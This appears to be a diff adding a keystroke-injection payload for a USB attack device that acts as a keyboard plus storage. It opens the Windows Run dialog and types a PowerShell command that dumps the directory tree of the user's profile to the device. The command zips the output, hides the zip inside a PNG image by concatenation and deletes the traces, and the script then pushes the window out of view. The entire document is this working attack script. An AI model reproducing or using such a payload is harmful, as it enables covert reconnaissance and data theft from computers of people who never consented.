@@ -1,0 +1,12 @@
+REM Payload that generates a tree log into Visble MSD partition (hided in image)
+WAITFOR_INIT
+DELAY 500
+GUI r
+DELAY 300
+STRING powershell "cd ((get-volume -filesystemlabel pendrive).driveletter+':\');tree c:/users/$env:username >data;compress-archive -path data -destinationpath cmp.zip;cmd /c copy /b monja.png+cmp.zip;rm data,cmp.zip"
+DELAY 200
+ENTER
+DELAY 300
+REM Hide cmd process
+GUI DOWN
+
